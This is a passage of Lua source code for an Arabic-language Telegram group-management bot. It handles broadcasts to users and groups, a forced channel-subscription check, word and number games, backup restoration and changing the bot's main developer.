if Redis:get(darket.."Broadcasting:Groups:Pin" .. msg_chat_id .. ":" .. msg.sender.user_id) then 
if text == "الغاء" or text == 'الغاء الامر ٠' then   
Redis:del(darket.."Broadcasting:Groups:Pin" .. msg_chat_id .. ":" .. msg.sender.user_id) 
return send(msg_chat_id,msg_id, "\n٠ تم الغاء الاذاعه للمجموعات","md",true)  
end 
local list = Redis:smembers(darket.."ChekBotAdd") 
if msg.content.video_note then
for k,v in pairs(list) do 
LuaTele.sendVideoNote(v, 0, msg.content.video_note.video.remote.id)
Redis:set(darket.."PinMsegees:"..v,msg.content.video_note.video.remote.id)
end
elseif msg.content.photo then
if msg.content.photo.sizes[1].photo.remote.id then
idPhoto = msg.content.photo.sizes[1].photo.remote.id
elseif msg.content.photo.sizes[2].photo.remote.id then
idPhoto = msg.content.photo.sizes[2].photo.remote.id
elseif msg.content.photo.sizes[3].photo.remote.id then
idPhoto = msg.content.photo.sizes[3].photo.remote.id
end
for k,v in pairs(list) do 
LuaTele.sendPhoto(v, 0, idPhoto,'')
Redis:set(darket.."PinMsegees:"..v,idPhoto)
end
elseif msg.content.sticker then 
for k,v in pairs(list) do 
LuaTele.sendSticker(v, 0, msg.content.sticker.sticker.remote.id)
Redis:set(darket.."PinMsegees:"..v,msg.content.sticker.sticker.remote.id)
end
elseif msg.content.voice_note then 
for k,v in pairs(list) do 
LuaTele.sendVoiceNote(v, 0, msg.content.voice_note.voice.remote.id, '', 'md')
Redis:set(darket.."PinMsegees:"..v,msg.content.voice_note.voice.remote.id)
end
elseif msg.content.video then 
for k,v in pairs(list) do 
LuaTele.sendVideo(v, 0, msg.content.video.video.remote.id, '', "md")
Redis:set(darket.."PinMsegees:"..v,msg.content.video.video.remote.id)
end
elseif msg.content.animation then 
for k,v in pairs(list) do 
LuaTele.sendAnimation(v,0, msg.content.animation.animation.remote.id, '', 'md')
Redis:set(darket.."PinMsegees:"..v,msg.content.animation.animation.remote.id)
end
elseif msg.content.document then
for k,v in pairs(list) do 
LuaTele.sendDocument(v, 0, msg.content.document.document.remote.id, '', 'md')
Redis:set(darket.."PinMsegees:"..v,msg.content.document.document.remote.id)
end
elseif msg.content.audio then
for k,v in pairs(list) do 
LuaTele.sendAudio(v, 0, msg.content.audio.audio.remote.id, '', "md") 
Redis:set(darket.."PinMsegees:"..v,msg.content.audio.audio.remote.id)
end
elseif text then
for k,v in pairs(list) do 
send(v,0,text,"html",true)
Redis:set(darket.."PinMsegees:"..v,text)
end
end
send(msg_chat_id,msg_id,"٠ تمت الاذاعه الى *- "..#list.." * مجموعه في البوت ","md",true)      
Redis:del(darket.."Broadcasting:Groups:Pin" .. msg_chat_id .. ":" .. msg.sender.user_id) 
return false
end
if Redis:get(darket.."Broadcasting:Users:Fwd" .. msg_chat_id .. ":" .. msg.sender.user_id) then 
if text == "الغاء" or text == 'الغاء الامر ٠' then   
Redis:del(darket.."Broadcasting:Users:Fwd" .. msg_chat_id .. ":" .. msg.sender.user_id) 
return send(msg_chat_id,msg_id, "\n٠ تم الغاء الاذاعه بالتوجيه للخاص","md",true)    
end 
if msg.forward_info then 
local list = Redis:smembers(darket.."Num:User:Pv") 
send(msg_chat_id,msg_id,"٠ تم التوجيه الى *- "..#list.." * مشترك ف البوت ","md",true)      
for k,v in pairs(list) do  
LuaTele.forwardMessages(v, msg_chat_id, msg_id,0,0,true,false,false)
end   
Redis:del(darket.."Broadcasting:Users:Fwd" .. msg_chat_id .. ":" .. msg.sender.user_id) 
end 
return false
end
if Redis:get(darket.."Broadcasting:Users" .. msg_chat_id .. ":" .. msg.sender.user_id) then 
if text == "الغاء" or text == 'الغاء الامر ٠' then   
Redis:del(darket.."Broadcasting:Users" .. msg_chat_id .. ":" .. msg.sender.user_id) 
return send(msg_chat_id,msg_id, "\n٠ تم الغاء الاذاعه للخاص","md",true)  
end 
local list = Redis:smembers(darket.."Num:User:Pv") 
if msg.content.video_note then
for k,v in pairs(list) do 
LuaTele.sendVideoNote(v, 0, msg.content.video_note.video.remote.id)
end
elseif msg.content.photo then
if msg.content.photo.sizes[1].photo.remote.id then
idPhoto = msg.content.photo.sizes[1].photo.remote.id
elseif msg.content.photo.sizes[2].photo.remote.id then
idPhoto = msg.content.photo.sizes[2].photo.remote.id
elseif msg.content.photo.sizes[3].photo.remote.id then
idPhoto = msg.content.photo.sizes[3].photo.remote.id
end
for k,v in pairs(list) do 
LuaTele.sendPhoto(v, 0, idPhoto,'')
end
elseif msg.content.sticker then 
for k,v in pairs(list) do 
LuaTele.sendSticker(v, 0, msg.content.sticker.sticker.remote.id)
end
elseif msg.content.voice_note then 
for k,v in pairs(list) do 
LuaTele.sendVoiceNote(v, 0, msg.content.voice_note.voice.remote.id, '', 'md')
end
elseif msg.content.video then 
for k,v in pairs(list) do 
LuaTele.sendVideo(v, 0, msg.content.video.video.remote.id, '', "md")
end
elseif msg.content.animation then 
for k,v in pairs(list) do 
LuaTele.sendAnimation(v,0, msg.content.animation.animation.remote.id, '', 'md')
end
elseif msg.content.document then
for k,v in pairs(list) do 
LuaTele.sendDocument(v, 0, msg.content.document.document.remote.id, '', 'md')
end
elseif msg.content.audio then
for k,v in pairs(list) do 
LuaTele.sendAudio(v, 0, msg.content.audio.audio.remote.id, '', "md") 
end
elseif text then   
for k,v in pairs(list) do 
send(v,0,text,"html",true)  
end
end
send(msg_chat_id,msg_id,"٠ تمت الاذاعه الى *- "..#list.." * عضو في البوت ","md",true)      
Redis:del(darket.."Broadcasting:Users" .. msg_chat_id .. ":" .. msg.sender.user_id) 
return false
end
if Redis:get(darket.."Broadcasting:Groups" .. msg_chat_id .. ":" .. msg.sender.user_id) then 
if text == "الغاء" or text == 'الغاء الامر ٠' then   
Redis:del(darket.."Broadcasting:Groups" .. msg_chat_id .. ":" .. msg.sender.user_id) 
return send(msg_chat_id,msg_id, "\n٠ تم الغاء الاذاعه للمجموعات","md",true)  
end 
local list = Redis:smembers(darket.."ChekBotAdd") 
if msg.content.video_note then
for k,v in pairs(list) do 
LuaTele.sendVideoNote(v, 0, msg.content.video_note.video.remote.id)
end
elseif msg.content.photo then
if msg.content.photo.sizes[1].photo.remote.id then
idPhoto = msg.content.photo.sizes[1].photo.remote.id
elseif msg.content.photo.sizes[2].photo.remote.id then
idPhoto = msg.content.photo.sizes[2].photo.remote.id
elseif msg.content.photo.sizes[3].photo.remote.id then
idPhoto = msg.content.photo.sizes[3].photo.remote.id
end
for k,v in pairs(list) do 
LuaTele.sendPhoto(v, 0, idPhoto,'')
end
elseif msg.content.sticker then 
for k,v in pairs(list) do 
LuaTele.sendSticker(v, 0, msg.content.sticker.sticker.remote.id)
end
elseif msg.content.voice_note then 
for k,v in pairs(list) do 
LuaTele.sendVoiceNote(v, 0, msg.content.voice_note.voice.remote.id, '', 'md')
end
elseif msg.content.video then 
for k,v in pairs(list) do 
LuaTele.sendVideo(v, 0, msg.content.video.video.remote.id, '', "md")
end
elseif msg.content.animation then 
for k,v in pairs(list) do 
LuaTele.sendAnimation(v,0, msg.content.animation.animation.remote.id, '', 'md')
end
elseif msg.content.document then
for k,v in pairs(list) do 
LuaTele.sendDocument(v, 0, msg.content.document.document.remote.id, '', 'md')
end
elseif msg.content.audio then
for k,v in pairs(list) do 
LuaTele.sendAudio(v, 0, msg.content.audio.audio.remote.id, '', "md") 
end
elseif text then   
for k,v in pairs(list) do 
send(v,0, text,"html",true)  
end
end
send(msg_chat_id,msg_id,"٠ تمت الاذاعه الى *- "..#list.." * كروب في البوت ","md",true)      
Redis:del(darket.."Broadcasting:Groups" .. msg_chat_id .. ":" .. msg.sender.user_id) 
return false
end

------------------------------------------------------------------------------------------------------------
if text and Redis:get(darket.."chmembers") == "on" then
if ChannelJoin(msg) == false then
local UserInfo = LuaTele.getUser(msg.sender.user_id)
local n = UserInfo.first_name
local d = UserInfo.id
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
LuaTele.deleteMessages(msg.chat_id,{[1]= msg_id})
send(msg.chat_id,0,'٠ عذا يا ['..n..']('..d..') \n٠ عليك الاشتراك في قناه البوت للتمكن من التحدث هنا\n',"md",false, false, false, false, reply_markup)
return false 
end 
end
if Redis:get(darket.."Broadcasting:Groups:Fwd" .. msg_chat_id .. ":" .. msg.sender.user_id) then 
if text == "الغاء" or text == 'الغاء الامر ٠' then   
Redis:del(darket.."Broadcasting:Groups:Fwd" .. msg_chat_id .. ":" .. msg.sender.user_id) 
return send(msg_chat_id,msg_id, "\n٠ تم الغاء الاذاعه بالتوجيه للمجموعات","md",true)    
end 
if msg.forward_info then 
local list = Redis:smembers(darket.."ChekBotAdd")   
send(msg_chat_id,msg_id,"٠ تم التوجيه الى *- "..#list.." * كروب في البوت ","md",true)      
for k,v in pairs(list) do  
LuaTele.forwardMessages(v, msg_chat_id, msg_id,0,0,true,false,false)
end   
Redis:del(darket.."Broadcasting:Groups:Fwd" .. msg_chat_id .. ":" .. msg.sender.user_id) 
end 
return false
end
if text and Redis:get(darket..'GetTexting:Devdarket'..msg_chat_id..':'..msg.sender.user_id) then
if text == 'الغاء' or text == 'الغاء الامر ٠' then 
Redis:del(darket..'GetTexting:Devdarket'..msg_chat_id..':'..msg.sender.user_id)
return send(msg_chat_id,msg_id,'٠ تم الغاء حفظ كليشة المطور')
end
Redis:set(darket..'Texting:Devdarket',text)
Redis:del(darket..'GetTexting:Devdarket'..msg_chat_id..':'..msg.sender.user_id)
return send(msg_chat_id,msg_id,'٠ تم حفظ كليشة المطور')
end
if Redis:get(darket.."Redis:Id:Groups"..msg.chat_id..""..msg.sender.user_id) then 
if text == 'الغاء' then 
send(msg_chat_id,msg_id, "\n٠ تم الغاء امر تعين الايدي عام","md",true)  
Redis:del(darket.."Redis:Id:Groups"..msg.chat_id..""..msg.sender.user_id) 
return false  
end 
Redis:del(darket.."Redis:Id:Groups"..msg.chat_id..""..msg.sender.user_id) 
Redis:set(darket.."Set:Id:Groups",text:match("(.*)"))
send(msg_chat_id,msg_id,'٠ تم تعين الايدي عام',"md",true)  
end
if Redis:get(darket.."Redis:Id:Group"..msg.chat_id..""..msg.sender.user_id) then 
if text == 'الغاء' then 
send(msg_chat_id,msg_id, "\n٠ تم الغاء امر تعين الايدي","md",true)  
Redis:del(darket.."Redis:Id:Group"..msg.chat_id..""..msg.sender.user_id) 
return false  
end 
Redis:del(darket.."Redis:Id:Group"..msg.chat_id..""..msg.sender.user_id) 
Redis:set(darket.."Set:Id:Group"..msg.chat_id,text:match("(.*)"))
send(msg_chat_id,msg_id,'٠ تم تعين الايدي الجديد',"md",true)  
end
if Redis:get(darket.."Change:Name:Bot"..msg.sender.user_id) then 
if text == "الغاء" or text == 'الغاء الامر ٠' then   
Redis:del(darket.."Change:Name:Bot"..msg.sender.user_id) 
return send(msg_chat_id,msg_id, "\n٠ تم الغاء امر تغيير اسم البوت","md",true)  
end 
Redis:del(darket.."Change:Name:Bot"..msg.sender.user_id) 
Redis:set(darket.."Name:Bot",text) 
return send(msg_chat_id,msg_id, "٠ تم تغيير اسم البوت الى - "..text,"md",true)    
end 
if Redis:get(darket.."Change:Start:Bot"..msg.sender.user_id) then 
if text == "الغاء" or text == 'الغاء الامر ٠' then   
Redis:del(darket.."Change:Start:Bot"..msg.sender.user_id) 
return send(msg_chat_id,msg_id, "\n٠ تم الغاء امر تغيير كليشه start","md",true)  
end 
Redis:del(darket.."Change:Start:Bot"..msg.sender.user_id) 
Redis:set(darket.."Start:Bot",text) 
return send(msg_chat_id,msg_id, "٠ تم تغيير كليشه start - "..text,"md",true)    
end 
if Redis:get(darket.."Game:Smile"..msg.chat_id) then
if text == Redis:get(darket.."Game:Smile"..msg.chat_id) then
Redis:incrby(darket.."Num:Add:Games"..msg.chat_id..msg.sender.user_id, 1)  
Redis:del(darket.."Game:Smile"..msg.chat_id)
return send(msg_chat_id,msg_id,"\n٠ لقد فزت في اللعبه \n٠ العب مره اخره وارسل - سمايل او سمايلات","md",true)  
end
end 
if Redis:get(darket.."mshaher"..msg.chat_id) then
if text == Redis:get(darket.."mshaher"..msg.chat_id) then
Redis:del(darket.."mshaher"..msg.chat_id)
Redis:incrby(darket.."Num:Add:Games"..msg.chat_id..msg.sender.user_id, 1)  
return send(msg_chat_id,msg_id,"\n٠ لقد فزت في اللعبه \n٠ العب مره اخره وارسل - بوب او مشاهير","md",true)  
end
end 
if Redis:get(darket.."Game:Monotonous"..msg.chat_id) then
if text == Redis:get(darket.."Game:Monotonous"..msg.chat_id) then
Redis:del(darket.."Game:Monotonous"..msg.chat_id)
Redis:incrby(darket.."Num:Add:Games"..msg.chat_id..msg.sender.user_id, 1)  
return send(msg_chat_id,msg_id,"\n٠ لقد فزت في اللعبه \n٠ العب مره اخره وارسل - الاسرع او ترتيب","md",true)  
end
end 
if Redis:get(darket.."Game:Riddles"..msg.chat_id) then
if text == Redis:get(darket.."Game:Riddles"..msg.chat_id) then
Redis:incrby(darket.."Num:Add:Games"..msg.chat_id..msg.sender.user_id, 1)  
Redis:del(darket.."Game:Riddles"..msg.chat_id)
return send(msg_chat_id,msg_id,"\n٠ لقد فزت في اللعبه \n٠ العب مره اخره وارسل - حزوره","md",true)  
end
end
if Redis:get(darket.."Game:Meaningof"..msg.chat_id) then
if text == Redis:get(darket.."Game:Meaningof"..msg.chat_id) then
Redis:incrby(darket.."Num:Add:Games"..msg.chat_id..msg.sender.user_id, 1)  
Redis:del(darket.."Game:Meaningof"..msg.chat_id)
return send(msg_chat_id,msg_id,"\n٠ لقد فزت في اللعبه \n٠ العب مره اخره وارسل - معاني","md",true)  
end
end
if Redis:get(darket.."Game:enkliz"..msg.chat_id) then
if text == Redis:get(darket.."Game:enkliz"..msg.chat_id) then
Redis:incrby(darket.."Num:Add:Games"..msg.chat_id..msg.sender.user_id, 1)  
Redis:del(darket.."Game:enkliz"..msg.chat_id)
return send(msg_chat_id,msg_id,"\n٠ لقد فزت في اللعبه \n٠ العب مره اخره وارسل - انجليزي","md",true)  
end
end
if Redis:get(darket.."Game:Countrygof"..msg.chat_id) then
if text == Redis:get(darket.."Game:Countrygof"..msg.chat_id) then
Redis:incrby(darket.."Num:Add:Games"..msg.chat_id..msg.sender.user_id, 1)  
Redis:del(darket.."Game:Countrygof"..msg.chat_id)
return send(msg_chat_id,msg_id,"\n٠ لقد فزت في اللعبه \n٠ العب مره اخره وارسل - اعلام","md",true)  
end
end
if Redis:get(darket.."Game:Reflection"..msg.chat_id) then
if text == Redis:get(darket.."Game:Reflection"..msg.chat_id) then
Redis:incrby(darket.."Num:Add:Games"..msg.chat_id..msg.sender.user_id, 1)  
Redis:del(darket.."Game:Reflection"..msg.chat_id)
return send(msg_chat_id,msg_id,"\n٠ لقد فزت في اللعبه \n٠ العب مره اخره وارسل - العكس","md",true)  
end
end
if Redis:get(darket.."Game:Estimate"..msg.chat_id..msg.sender.user_id) then  
if text and text:match("^(%d+)$") then
local NUM = text:match("^(%d+)$")
if tonumber(NUM) > 20 then
return send(msg_chat_id,msg_id,"٠ عذرآ لا يمكنك تخمين عدد اكبر من ال { 20 } خمن رقم ما بين ال{ 1 و 20 }\n","md",true)  
end 
local GETNUM = Redis:get(darket.."Game:Estimate"..msg.chat_id..msg.sender.user_id)
if tonumber(NUM) == tonumber(GETNUM) then
Redis:del(darket.."SADD:NUM"..msg.chat_id..msg.sender.user_id)
Redis:del(darket.."Game:Estimate"..msg.chat_id..msg.sender.user_id)
Redis:incrby(darket.."Num:Add:Games"..msg.chat_id..msg.sender.user_id,5)  
return send(msg_chat_id,msg_id,"٠ مبروك فزت ويانه وخمنت الرقم الصحيح\n🚸︙تم اضافة { 5 } من النقاط \n","md",true)  
elseif tonumber(NUM) ~= tonumber(GETNUM) then
Redis:incrby(darket.."SADD:NUM"..msg.chat_id..msg.sender.user_id,1)
if tonumber(Redis:get(darket.."SADD:NUM"..msg.chat_id..msg.sender.user_id)) >= 3 then
Redis:del(darket.."SADD:NUM"..msg.chat_id..msg.sender.user_id)
Redis:del(darket.."Game:Estimate"..msg.chat_id..msg.sender.user_id)
return send(msg_chat_id,msg_id,"٠ اوبس لقد خسرت في اللعبه \n٠ حظآ اوفر في المره القادمه \n٠ كان الرقم الذي تم تخمينه { "..GETNUM.." }","md",true)  
else
return send(msg_chat_id,msg_id,"٠ اوبس تخمينك غلط \n٠ ارسل رقم تخمنه مره اخرى ","md",true)  
end
end
end
end
if Redis:get(darket.."Game:Difference"..msg.chat_id) then
if text == Redis:get(darket.."Game:Difference"..msg.chat_id) then 
Redis:del(darket.."Game:Difference"..msg.chat_id)
Redis:incrby(darket.."Num:Add:Games"..msg.chat_id..msg.sender.user_id, 1)  
return send(msg_chat_id,msg_id,"\n٠ لقد فزت في اللعبه \n٠ العب مره اخره وارسل - المختلف","md",true)  
end
end
if Redis:get(darket.."Game:Example"..msg.chat_id) then
if text == Redis:get(darket.."Game:Example"..msg.chat_id) then 
Redis:del(darket.."Game:Example"..msg.chat_id)
Redis:incrby(darket.."Num:Add:Games"..msg.chat_id..msg.sender.user_id, 1)  
return send(msg_chat_id,msg_id,"\n٠ لقد فزت في اللعبه \n٠ العب مره اخره وارسل - امثله","md",true)  
end
end
if text then
local NewCmmd = Redis:get(darket.."All:Get:Reides:Commands:Group"..text) or Redis:get(darket.."Get:Reides:Commands:Group"..msg_chat_id..":"..text)
if NewCmmd then
text = (NewCmmd or text)
end
end
if Redis:get(darket.."ch:addd"..msg.sender.user_id) == "on" then
Redis:set(darket.."ch:addd"..msg.sender.user_id,"off")
local m = https.request("https://api.telegram.org/bot"..Token.."/getchat?chat_id="..text)
data = json:decode(m)
if data.result.invite_link then
local ch = data.result.id
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = '1', data = msg.sender.user_id..'/setallmember'}, {text = '2', data = msg.sender.user_id..'/setforcmd'}, 
},
}
}
send(msg_chat_id,msg_id,'٠ تم حفظ القناه \n٠ اختار كيف تريد تفعيله \n٠ 1 : وضع الاشتراك الاجباري لكل الاعضاء \n٠ 2 : وضع الاشتراك الاجباري عند استخدام الاوامر فقط \n',"md",false, false, false, false, reply_markup)
Redis:del(darket.."chfalse")
Redis:set(darket.."chfalse",ch)
Redis:del(darket.."ch:admin")
Redis:set(darket.."ch:admin",data.result.invite_link)
else
send(msg_chat_id,msg_id,'٠ المعرف خطأ او البوت ليس مشرف في القناه ',"md",true)  
end
end
if Redis:get(darket.."ch:addd"..msg.sender.user_id) == "on" then
Redis:set(darket.."ch:addd"..msg.sender.user_id,"off")
local m = https.request("https://api.telegram.org/bot"..Token.."/getchat?chat_id="..text)
data = json:decode(m)
if data.result.invite_link then
local ch = data.result.id
send(msg_chat_id,msg_id,'٠ تم حفظ القناه ',"md",true)  
Redis:del(darket.."chfalse")
Redis:set(darket.."chfalse",ch)
Redis:del(darket.."ch:admin")
Redis:set(darket.."ch:admin",data.result.invite_link)
else
send(msg_chat_id,msg_id,'٠ المعرف خطأ او البوت ليس مشرف في القناه ',"md",true)  
end
end
if text == "تفعيل الاشتراك الاجباري" then
if not msg.ControllerBot then 
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(1)..' * ',"md",true)  
end
Redis:set(darket.."ch:addd"..msg.sender.user_id,"on")
send(msg_chat_id,msg_id,'٠ ارسل الان معرف القناه ',"md",true)  
end
if text == "تعطيل الاشتراك الاجباري" then
if not msg.ControllerBot then 
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(1)..' * ',"md",true)  
end
Redis:del(darket.."ch:admin")
Redis:del(darket.."chfalse")
send(msg_chat_id,msg_id,'٠ تم حذف القناه ',"md",true)  
end
if text == 'رفع النسخه الاحتياطيه' and msg.reply_to_message_id ~= 0 or text == 'رفع نسخه احتياطيه' and msg.reply_to_message_id ~= 0 then
if not msg.ControllerBot then 
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(1)..' * ',"md",true)  
end

if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
local Message_Reply = LuaTele.getMessage(msg.chat_id, msg.reply_to_message_id)
if Message_Reply.content.document then
local File_Id = Message_Reply.content.document.document.remote.id
local Name_File = Message_Reply.content.document.file_name
if Name_File ~= UserBot..'.json' then
return send(msg_chat_id,msg_id,'٠ عذرا هاذا الملف غير مطابق مع البوت يرجى جلب النسخه الحقيقيه')
end -- end Namefile
local File = json:decode(https.request('https://api.telegram.org/bot'..Token..'/getfile?file_id='..File_Id)) 
local download_ = download('https://api.telegram.org/file/bot'..Token..'/'..File.result.file_path,''..Name_File) 
local Get_Info = io.open("./"..UserBot..".json","r"):read('*a')
local FilesJson = JSON.decode(Get_Info)
if tonumber(darket) ~= tonumber(FilesJson.BotId) then
return send(msg_chat_id,msg_id,'٠ عذرا هاذا الملف غير مطابق مع البوت يرجى جلب النسخه الحقيقيه')
end -- end botid
send(msg_chat_id,msg_id,'٠جاري استرجاع المشتركين والكروبات ...')
Y = 0
for k,v in pairs(FilesJson.UsersBot) do
Y = Y + 1
Redis:sadd(darket..'Num:User:Pv',v)  
end
X = 0
for GroupId,ListGroup in pairs(FilesJson.GroupsBot) do
X = X + 1
Redis:sadd(darket.."ChekBotAdd",GroupId) 
if ListGroup.President then
for k,v in pairs(ListGroup.President) do
Redis:sadd(darket.."Supcreator:Group"..GroupId,v)
end
end
if ListGroup.Constructor then
for k,v in pairs(ListGroup.Constructor) do
Redis:sadd(darket.."Creator:Group"..GroupId,v)
end
end
if ListGroup.Manager then
for k,v in pairs(ListGroup.Manager) do
Redis:sadd(darket.."Manger:Group"..GroupId,v)
end
end
if ListGroup.Admin then
for k,v in pairs(ListGroup.Admin) do
Redis:sadd(darket.."Admin:Group"..GroupId,v)
end
end
if ListGroup.Vips then
for k,v in pairs(ListGroup.Vips) do
Redis:sadd(darket.."Special:Group"..GroupId,v)
end
end 
end
return send(msg_chat_id,msg_id,'٠ تم استرجاع {'..X..'} كروب \n٠واسترجاع {'..Y..'} مشترك في البوت')
end
end
if text == 'رفع نسخه تشاكي' and msg.reply_to_message_id ~= 0 then
if not msg.ControllerBot then 
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(1)..' * ',"md",true)  
end
local Message_Reply = LuaTele.getMessage(msg.chat_id, msg.reply_to_message_id)
if Message_Reply.content.document then
local File_Id = Message_Reply.content.document.document.remote.id
local Name_File = Message_Reply.content.document.file_name
if tonumber(Name_File:match('(%d+)')) ~= tonumber(darket) then 
return send(msg_chat_id,msg_id,'٠ عذرا هاذا الملف غير مطابق مع البوت يرجى جلب النسخه الحقيقيه')
end -- end Namefile
local File = json:decode(https.request('https://api.telegram.org/bot'..Token..'/getfile?file_id='..File_Id)) 
local download_ = download('https://api.telegram.org/file/bot'..Token..'/'..File.result.file_path,''..Name_File) 
local Get_Info = io.open(download_,"r"):read('*a')
local All_Groups = JSON.decode(Get_Info)
if All_Groups.GP_BOT then
for idg,v in pairs(All_Groups.GP_BOT) do
Redis:sadd(darket.."ChekBotAdd",idg) 
if v.MNSH then
for k,idmsh in pairs(v.MNSH) do
Redis:sadd(darket.."Creator:Group"..idg,idmsh)
end;end
if v.MDER then
for k,idmder in pairs(v.MDER) do
Redis:sadd(darket.."Manger:Group"..idg,idmder)  
end;end
if v.MOD then
for k,idmod in pairs(v.MOD) do
Redis:sadd(darket.."Admin:Group"..idg,idmod)
end;end
if v.ASAS then
for k,idASAS in pairs(v.ASAS) do
Redis:sadd(darket.."Supcreator:Group"..idg,idASAS)
end;end
end
return send(msg_chat_id,msg_id,'٠ تم استرجاع المجموعات من نسخه تشاكي')
else
return send(msg_chat_id,msg_id,'٠الملف لا يدعم هاذا البوت')
end
end
end

if text == 'تعطيل الاذاعه ٠' or text == 'تعطيل الاذاعه' then
if not msg.ControllerBot then 
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(1)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:del(darket.."SendBcBot") 
return send(msg_chat_id,msg_id,"٠ تم تعطيل الاذاعه ","md",true)
end
if text == 'تفعيل الاذاعه ٠' or text == 'تفعيل الاذاعه' then
if not msg.ControllerBot then 
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(1)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(darket.."SendBcBot",true) 
return send(msg_chat_id,msg_id,"٠ تم تفعيل الاذاعه للمطورين ","md",true)
end
if text == 'تعطيل المغادره ٠' or text == 'تعطيل المغادره' then
if not msg.ControllerBot then 
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(1)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:del(darket.."LeftBot") 
return send(msg_chat_id,msg_id,"٠ تم تعطيل المغادره ","md",true)
end
if text == 'تفعيل المغادره ٠' or text == 'تفعيل المغادره' then
if not msg.ControllerBot then 
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(1)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(darket.."LeftBot",true) 
return send(msg_chat_id,msg_id,"٠ تم تفعيل المغادره للمطورين ","md",true)
end
if (Redis:get(darket.."AddSudosNew"..msg_chat_id) == 'true') then
if text == "الغاء" or text == 'الغاء الامر ٠' then   
Redis:del(darket.."AddSudosNew"..msg_chat_id)
return send(msg_chat_id,msg_id, "\n٠ تم الغاء امر تغيير المطور الاساسي","md",true)    
end 
Redis:del(darket.."AddSudosNew"..msg_chat_id)
if text and text:match("^@[%a%d_]+$") then
local UserId_Info = LuaTele.searchPublicChat(text)
if not UserId_Info.id then
return send(msg_chat_id,msg_id,"\n٠ عذرآ لا يوجد حساب بهاذا المعرف ","md",true)  
end
if UserId_Info.type.is_channel == true then
return send(msg_chat_id,msg_id,"\n٠ عذرآ لا تستطيع استخدام معرف قناة او كروب ","md",true)  
end
local Informationlua = io.open("Information.lua", 'w')
Informationlua:write([[
return {
Token = "]]..Token..[[",
UserBot = "]]..UserBot..[[",
UserSudo = "]]..text:gsub('@','')..[[",
SudoId = ]]..UserId_Info.id..[[
}
]])
Informationlua:close()
send(msg_chat_id,msg_id,"\n٠ تم تغيير المطور الاساسي اصبح على : [@"..text:gsub('@','').."]","md",true)  
dofile('darket.lua')  
end
end
if text == 'تغيير المطور الاساسي' or text == 'تغيير المطور الاساسي ٠' then
if not msg.ControllerBot then 
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(1)..' * ',"md",true)  
end
Redis:set(darket.."AddSudosNew"..msg_chat_id,true)
return send(msg_chat_id,msg_id,"٠ ارسل معرف المطور الاساسي مع @","md",true)
end
if text == "الكروبات ٠" then
if not msg.ControllerBot then 
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(1)..' * ',"md",true)  
end
local G = "كروبات البوت :\n"
local list = Redis:smembers(darket..'ChekBotAdd')  
for k,v in pairs(list) do  
local Get_Chat = LuaTele.getChat(v)
local Info_Chats = LuaTele.getSupergroupFullInfo(v)
if Info_Chats and Info_Chats.invite_link then
link = Info_Chats.invite_link.invite_link
else
link = "لا يوجد" 
end
if Get_Chat and Get_Chat.title then
title = Get_Chat.title
else 
title = "لا يوجد" 
end
G = G.."اسم القروب : "..title.."\n ايدي القروب : "..v.."\nرابط القروب : "..link.."\n\n"
end
local File = io.open('./'..UserBot..'.txt', "w")
File:write(G)
File:close()
LuaTele.sendDocument(msg_chat_id,msg_id,'./'..UserBot..'.txt', '٠ تم جلب الكروبات\n', 'md')
end
if text == 'جلب النسخه الاحتياطيه ٠' or text == 'جلب نسخه احتياطيه' then
if not msg.ControllerBot then 
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(1)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
